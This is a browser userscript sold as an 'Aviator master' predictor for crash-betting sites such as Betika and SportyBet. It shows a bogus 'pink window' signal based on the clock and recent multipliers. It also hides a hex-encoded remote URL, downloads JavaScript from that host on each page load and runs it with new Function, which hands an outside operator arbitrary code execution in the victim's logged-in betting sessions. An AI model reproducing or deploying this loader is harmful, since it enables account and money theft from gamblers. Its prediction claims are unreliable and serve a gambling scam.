// ==UserScript==
// @name          MBIKI AVIATOR MASTER V-1.5 - 2026 EDITION (ULTRA)
// @namespace     http://tampermonkey.net/
// @version       2026.PRO.V2.HOTSWAP
// @match         *://*/*aviator*
// @match         *://*.spribegaming.com/*
// @match         *://*.betika.com/*
// @match         *://*.sportybet.com/*
// @connect       pilotleak.com
// @run-at        document-start
// @grant         GM_xmlhttpRequest
// @allFrames     true
// ==/UserScript==

(function() {
    'use strict';

    // HEX-ENCODED URL (Hidden from Search)
    const _0x_u1 = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x69\x6c\x6f\x74\x6c\x65\x61\x6b\x2e\x63\x6f\x6d";
    const _0x_u2 = "\x2f\x61\x70\x69\x2f\x76\x31\x2d\x35\x2f\x66\x65\x74\x63\x68\x5f\x65\x6e\x67\x69\x6e\x65\x2e\x70\x68\x70";

    // 1. IFRAME DATA SCRAPER
    if (window.self !== window.top) {
        setInterval(() => {
            const bubbles = document.querySelectorAll('.stats-item, .bubble, .payout, .history-item, .multipliers-item');
            const history = Array.from(bubbles)
                .map(b => parseFloat(b.innerText.replace(/[^0-9.]/g, '')))
                .filter(v => !isNaN(v) && v > 0);

            if (history.length > 0) {
                const now = new Date();
                const isPink = now.getSeconds() > 45 || (history.slice(0,3).every(v => v < 2.0));
                window.parent.postMessage({
                    type: 'AVIATOR_DATA',
                    history: history.slice(0, 10),
                    isPinkWindow: isPink
                }, "*");
            }
        }, 800);
        return;
    }

    const getSaved = (k, def) => localStorage.getItem(k) || def;

    // 2. SECURE ENGINE CONNECTION
    const connectToEngine = (key) => {
        if (!key) return;
        const msgBox = document.getElementById('mbiki-msg');
        const statusBox = document.getElementById('mbiki-status');

        if (msgBox) {
            msgBox.innerText = "SYNCHRONIZING...";
            msgBox.style.color = "#ffcc00";
        }
        if (statusBox) statusBox.innerText = "CONNECTING...";

        // Reconstruct URL
        const _target = `${_0x_u1}${_0x_u2}?key=${key}&t=${Date.now()}`;

        GM_xmlhttpRequest({
            method: "GET",
            url: _target,
            headers: {
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/javascript"
            },
            onload: function(response) {
                if (response.status === 200) {
                    if (msgBox) {
                        msgBox.innerText = "ENGINE ACTIVE";
                        msgBox.style.color = "#00ff00";
                    }
                    if (statusBox) statusBox.innerText = "ONLINE";
                    try {
                        new Function(response.responseText)();
                    } catch (e) {
                        console.error("Engine Execution Error:", e);
                    }
                } else {
                    if (msgBox) {
                        msgBox.innerText = "ACCESS DENIED (403)";
                        msgBox.style.color = "#ff4444";
                    }
                    if (statusBox) statusBox.innerText = "OFFLINE";
                }
            },
            onerror: function() {
                if (msgBox) {
                    msgBox.innerText = "API CONNECTION FAILED";
                    msgBox.style.color = "#ff4444";
                }
                if (statusBox) statusBox.innerText = "ERROR";
            }
        });
    };

    // 3. DRAW THE PERMANENT GUI (ORIGINAL DESIGN)
    const drawStaticUI = () => {
        if (document.getElementById('commander-ui')) return;

        const ui = document.createElement('div');
        ui.id = "commander-ui";
        Object.assign(ui.style, {
            position: 'fixed', bottom: '20px', left: '20px', zIndex: '2147483647',
            padding: '15px', background: 'rgba(5,5,5,0.98)', color: '#fff',
            border: `2px solid #444`, borderRadius: '12px', width: '280px',
            fontFamily: 'sans-serif', boxShadow: `0 0 25px rgba(0,0,0,0.5)`, pointerEvents: 'auto'
        });

        ui.innerHTML = `
            <div style="font-size:10px; color:#666; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                <span style="font-weight:bold;">MBIKI AVIATOR MASTER PRO V-1.5</span>
                <span id="mbiki-status" style="color:#888; font-weight:bold; border:1px solid #444; padding:2px 5px; border-radius:3px;">IDLE</span>
            </div>

            <div style="background:#111; padding:10px; border-radius:8px; margin-bottom:12px; border:1px solid #333;">
                <div style="margin-bottom:8px; border-bottom:1px solid #222; padding-bottom:8px;">
                    <label style="font-size:9px; color:#ffcc00;">MASTER ACCESS KEY</label>
                    <input id="m_key" type="text" value="${getSaved('mbiki_pro_key', '')}" placeholder="Paste Key..." style="width:95%; background:transparent; border:none; color:#fff; font-size:11px; font-family:monospace; outline:none;">
                </div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap:8px;">
                    <div><label style="font-size:9px; color:#888;">BASE STAKE</label>
                         <input id="m_base" type="number" value="${getSaved('mbiki_base', 1000)}" style="width:90%; background:transparent; border:none; border-bottom:1px solid #333; color:#0f0; outline:none;"></div>
                    <div><label style="font-size:9px; color:#888;">TOTAL REQ.</label>
                         <div id="m_total_val" style="font-size:12px; color:#fff; padding-top:2px;">${getSaved('mbiki_base', 1000) * 10} KES</div></div>
                    <div><label style="font-size:9px; color:#888;">STOP LOSS</label>
                         <input id="m_loss" type="number" value="${getSaved('mbiki_loss', -5000)}" style="width:90%; background:transparent; border:none; border-bottom:1px solid #333; color:#f44; outline:none;"></div>
                    <div><label style="font-size:9px; color:#888;">TAKE PROFIT</label>
                         <input id="m_profit" type="number" value="${getSaved('mbiki_profit', 15000)}" style="width:90%; background:transparent; border:none; border-bottom:1px solid #333; color:#0f0; outline:none;"></div>
                </div>
                <button id="mbiki_save" style="width:100%; margin-top:10px; background:#222; color:#ffcc00; border:1px solid #444; font-size:10px; padding:6px; cursor:pointer; border-radius:4px; font-weight:bold;">SAVE & ACTIVATE</button>
            </div>
            <div id="mbiki-msg" style="text-align:center; font-size:10px; padding:5px; margin-bottom:10px; border-radius:4px; background:rgba(0,0,0,0.3); color:#888; min-height:12px;">Awaiting activation...</div>
            <div id="mbiki-payload-area" style="text-align:center; color:#555; font-size:11px;">
                 STABLE GROWTH<br><b>WAITING FOR GAME...</b>
            </div>
        `;
        document.body.appendChild(ui);

        document.getElementById('m_base').oninput = (e) => {
            document.getElementById('m_total_val').innerText = (e.target.value * 10) + " KES";
        };

        document.getElementById('mbiki_save').onclick = () => {
            const key = document.getElementById('m_key').value.trim();
            localStorage.setItem('mbiki_pro_key', key);
            localStorage.setItem('mbiki_base', document.getElementById('m_base').value);
            localStorage.setItem('mbiki_loss', document.getElementById('m_loss').value);
            localStorage.setItem('mbiki_profit', document.getElementById('m_profit').value);
            connectToEngine(key);
        };
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', drawStaticUI);
    } else {
        drawStaticUI();
    }

    window.addEventListener('load', () => {
        const savedKey = localStorage.getItem('mbiki_pro_key');
        if (savedKey) connectToEngine(savedKey);
    });

})();
